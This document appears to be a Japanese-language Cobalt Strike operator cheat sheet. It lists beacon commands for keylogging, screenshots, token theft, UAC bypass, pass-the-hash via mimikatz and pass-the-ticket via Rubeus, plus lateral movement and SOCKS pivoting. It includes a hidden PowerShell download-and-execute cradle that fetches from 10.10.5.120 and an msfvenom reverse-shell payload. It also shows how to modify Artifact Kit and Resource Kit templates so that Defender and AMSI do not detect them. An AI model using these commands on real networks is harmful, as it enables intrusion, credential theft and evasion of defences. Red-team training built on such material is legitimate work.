# Cobalt Strike

### リスナー

### C2リスナー

`Cobalt Strike -> リスナー -> 追加/編集` で、リスンする場所、使用するビーコンの種類（http、dns、smbなど）などを選択できます。

### Peer2Peerリスナー

これらのリスナーのビーコンは、C2と直接通信する必要はありません。他のビーコンを介して通信することができます。

`Cobalt Strike -> リスナー -> 追加/編集` で、TCPまたはSMBビーコンを選択する必要があります。

* **TCPビーコンは、選択したポートにリスナーを設定します**。別のビーコンからTCPビーコンに接続するには、`connect <ip> <port>` コマンドを使用します。
* **SMBビーコンは、選択した名前のパイプでリスンします**。SMBビーコンに接続するには、`link [target] [pipe]` コマンドを使用する必要があります。

### ペイロードの生成とホスト

#### ファイルへのペイロードの生成

`攻撃 -> パッケージ ->`&#x20;

* **`HTMLApplication`** HTAファイル用
* **`MS Office Macro`** マクロを含むオフィスドキュメント用
* **`Windows Executable`** .exe、.dll、またはサービス .exe 用
* **`Windows Executable (S)`** **ステージレス** .exe、.dll、またはサービス .exe 用（ステージドよりもステージレスの方がIoCが少ない）

#### ペイロードの生成とホスト

`攻撃 -> Web Drive-by -> スクリプト化されたWeb配信（S）` これにより、bitsadmin、exe、powershell、pythonなどの形式でCobalt Strikeからビーコンをダウンロードするためのスクリプト/実行可能ファイルが生成されます。

#### ペイロードのホスト

ウェブサーバーにホストするファイルがすでにある場合は、`攻撃 -> Web Drive-by -> ファイルのホスト` に移動し、ホストするファイルとウェブサーバーの設定を選択します。

### ビーコンオプション

<pre class="language-bash"><code class="lang-bash"># ローカルの.NETバイナリの実行
execute-assembly &#x3C;/path/to/executable.exe>

# スクリーンショット
printscreen    # PrintScrメソッドを使用して単一のスクリーンショットを撮影する
screenshot     # 単一のスクリーンショットを撮影する
screenwatch    # デスクトップの定期的なスクリーンショットを撮影する
## これらを表示するには、表示 -> スクリーンショットに移動します

# キーロガー
keylogger [pid] [x86|x64]
## キーストロークを表示するには、表示 > キーストロークに移動します

# ポートスキャン
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # 他のプロセス内でポートスキャンアクションをインジェクトする
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
# Powershellモジュールのインポート
powershell-import C:\path\to\PowerView.ps1
powershell &#x3C;ここにpowershellコマンドを記述>

# ユーザーのなりすまし
## 資格情報を使用してトークンを生成
make_token [DOMAIN\user] [password] # ネットワーク内のユーザーをなりすますためのトークンを作成
ls \\computer_name\c$ # 生成されたトークンを使用してコンピューターのC$にアクセスしようとする
rev2self # make_tokenで生成されたトークンの使用を停止する
## make_tokenの使用により、イベント4624が生成されます。このイベントはWindowsドメインでは非常に一般的ですが、ログオンタイプでフィルタリングすることで絞り込むことができます。前述のように、LOGON32_LOGON_NEW_CREDENTIALSを使用しています。

# UACバイパス
elevate svc-exe &#x3C;リスナー>
elevate uac-token-duplication &#x3C;リスナー>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## pidからトークンを盗む
## make_tokenと同様ですが、プロセスからトークンを盗みます
steal_token [pid] # また、これはローカルアクションではなく、ネットワークアクションにも役立ちます
## APIドキュメントからわかるように、このログオンタイプは「呼び出し元が現在のトークンをクローンできる」ことを意味します。これがBeaconの出力にImpersonated &#x3C;current_username>と表示される理由です-自分自身のクローンされたトークンをなりすましています。
ls \\computer_name\c$ # 生成されたトークンを使用してコンピューターのC$にアクセスしようとする
rev2self # steal_tokenからのトークンの使用を停止する

## 新しい資格情報でプロセスを起動する
spawnas [domain\username] [password] [listener] # 読み取りアクセスがあるディレクトリ（例：cd C:\）から実行します
## make_tokenと同様に、これによりWindowsイベント4624が生成されます。ログオンタイプは2（LOGON32_LOGON_INTERACTIVE）です。呼び出し元のユーザー（TargetUserName）となりすましたユーザー（TargetOutboundUserName）が詳細に表示されます。

## プロセスにインジェクトする
inject [pid] [x64|x86] [listener]
## OpSecの観点からは、本当に必要な場合以外はクロスプラットフォームのインジェクションを実行しないでください（例：x86 -> x64またはx64 -> x86）。

## ハッシュの渡し
## この変更プロセスでは、高リスクなアクションであるLSASSメモリのパッチが必要であり、ローカル管理者特権が必要であり、Protected Process Light（PPL）が有効になっている場合は実行できません。
pth [pid] [arch] [DOMAIN\user] [NTLMハッシュ]
pth [DOMAIN\user] [NTLMハッシュ]

## mimikatzを介したハッシュの渡し
mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
## /runがない場合、mimikatzはcmd.exeを生成します。デスクトップを実行しているユーザーはシェルを見ることができます（SYSTEMとして実行している場合は問題ありません）
steal_token &#x3C;pid> # mimikatzによって作成されたプロセスからトークンを盗む

## チケットの渡し
## チケットの要求
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;domain> /aes256:&#x3C;aes_keys> /nowrap /opsec
## 新しいチケットを使用するための新しいログオンセッションを作成する（侵害されたセッションを上書きしないようにするため）
make_token &#x3C;domain>\&#x3C;username> DummyPass
## 攻撃者のマシンにチケットを書き込んでロードする
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
## SYSTEMからチケットを渡す
## チケットを持つ新しいプロセスを生成する
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;ユーザー名> /domain:&#x3C;ドメイン> /aes256:&#x3C;AESキー> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## そのプロセスからトークンを盗む
steal_token &#x3C;pid>

## チケットの抽出 + チケットの渡し
### チケットの一覧表示
execute-assembly C:\path\Rubeus.exe triage
### LUIDによる興味深いチケットのダンプ
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
### 新しいログオンセッションを作成し、LUIDとプロセスIDをメモする
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### 生成されたログオンセッションにチケットを挿入する
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### 最後に、その新しいプロセスからトークンを盗む
steal_token &#x3C;pid>

# 横方向の移動
## トークンが作成された場合は使用されます
jump [method] [target] [listener]
## メソッド:
## psexec                    x86   サービスを使用してService EXEアーティファクトを実行する
## psexec64                  x64   サービスを使用してService EXEアーティファクトを実行する
## psexec_psh                x86   サービスを使用してPowerShellのワンライナーを実行する
## winrm                     x86   WinRMを介してPowerShellスクリプトを実行する
## winrm64                   x64   WinRMを介してPowerShellスクリプトを実行する

remote-exec [method] [target] [command]
## メソッド:
<strong>## psexec                          サービス制御マネージャーを介してリモート実行する
</strong>## winrm                           WinRMを介してリモート実行する（PowerShell）
## wmi                             WMIを介してリモート実行する

## wmiでビーコンを実行するには（jumpコマンドには含まれていません）、ビーコンをアップロードして実行するだけです
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Metasploitにセッションを渡す - リスナーを介して
## Metasploitホストで
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## Cobaltで: Listeners > Add として、PayloadをForeign HTTPに設定します。Hostを10.10.5.120、Portを8080に設定し、保存をクリックします。
beacon> spawn metasploit
## Foreignリスナーではx86 Meterpreterセッションのみを生成できます。

# Metasploitにセッションを渡す - シェルコードインジェクションを介して
## Metasploitホストで
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
## msfvenomを実行し、multi/handlerリスナーを準備します

## binファイルをCobalt Strikeホストにコピーします
ps
shinject &#x3C;pid> x64 C:\Payloads\msf.bin #x64プロセスにMetasploitのシェルコードをインジェクトする

# MetasploitセッションをCobalt Strikeに渡す
## ステージレスのBeaconシェルコードを生成します。Attacks > Packages > Windows Executable (S)に移動し、希望するリスナーを選択し、出力タイプとしてRawを選択し、x64ペイロードを使用するように選択します。
## Metasploitのpost/windows/manage/shellcode_injectを使用して生成されたCobalt Strikeのシェルコードをインジェクトします


# ピボット
## チームサーバーでソックスプロキシを開く
beacon> socks 1080

# SSH接続
beacon> ssh 10.10.17.12:22 ユーザー名 パスワード</code></pre>

## AV回避

### Artifact Kit

通常、`/opt/cobaltstrike/artifact-kit`には、Cobalt Strikeがバイナリビーコンを生成するために使用するペイロードのコードと事前コンパイルされたテンプレート（`/src-common`内）が含まれています。

[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)を生成されたバックドア（またはコンパイルされたテンプレート）と一緒に使用して、Defenderがトリガーされる要因を見つけることができます。通常、それは文字列です。したがって、バックドアを生成しているコードを変更し、その文字列が最終的なバイナリに表示されないようにします。

コードを変更した後、同じディレクトリから`./build.sh`を実行し、`dist-pipe/`フォルダをWindowsクライアントの`C:\Tools\cobaltstrike\ArtifactKit`にコピーします。
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
忘れずに攻撃的なスクリプト `dist-pipe\artifact.cna` をロードして、Cobalt Strikeにディスクから必要なリソースを使用させるように指示します。

### リソースキット

リソースキットフォルダには、Cobalt Strikeのスクリプトベースのペイロード（PowerShell、VBA、HTAを含む）のテンプレートが含まれています。

テンプレートを使用して[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)を実行すると、ディフェンダー（この場合はAMSI）が好ましくないものを見つけて修正することができます。
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
検出された行を変更することで、検知されないテンプレートを生成することができます。

Cobalt Strikeにディスクから必要なリソースをロードさせるために、攻撃的なスクリプト `ResourceKit\resources.cna` を読み込むことを忘れないでください。
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

